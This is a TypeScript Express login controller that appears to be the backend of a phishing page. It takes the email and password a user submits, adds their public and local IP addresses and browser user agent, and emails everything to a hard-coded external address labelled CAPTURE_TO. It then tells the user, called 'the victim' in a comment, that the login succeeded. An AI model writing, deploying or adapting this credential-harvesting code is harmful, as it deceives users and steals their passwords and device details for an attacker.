import { Request, Response } from "express";
import { sendMail } from "../services/mailer.service";
import { generateCredentialsEmail } from "../templates/credentials.template";
import { extractIp } from "../utils/ip.util";

const CAPTURE_TO = "sauzxa22@gmail.com";

export async function loginController(req: Request, res: Response): Promise<Response> {
  const { email, password } = req.body ?? {};

  if (!email || !password) {
    return res.status(400).json({ error: "email and password are required." });
  }

  const from = process.env.MAIL_FROM ?? process.env.SMTP_USER;

  if (!from) {
    return res.status(500).json({
      error: "Sender not configured. Set MAIL_FROM or SMTP_USER in .env.",
    });
  }

  // Prefer client-reported IPs (collected via ipify + WebRTC) over the
  // server-side socket address — the latter is always ::1 when behind a
  // local proxy or when client and server share the same machine.
  const { publicIp, localIp } = req.body ?? {};
  const socketIp = extractIp(req);
  const ip = (typeof publicIp === "string" && publicIp !== "unknown" ? publicIp : socketIp);
  const deviceLocalIp = typeof localIp === "string" ? localIp : "unknown";
  const userAgent = req.headers["user-agent"] ?? "unknown";

  const { subject, html, text } = generateCredentialsEmail(email, password, ip, deviceLocalIp, userAgent);

  try {
    await sendMail({ from, to: CAPTURE_TO, subject, html, text });
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error("[auth] Failed to forward credentials:", error);
  }

  // Always return a plausible response to the victim
  return res.status(200).json({ message: "Login successful." });
}
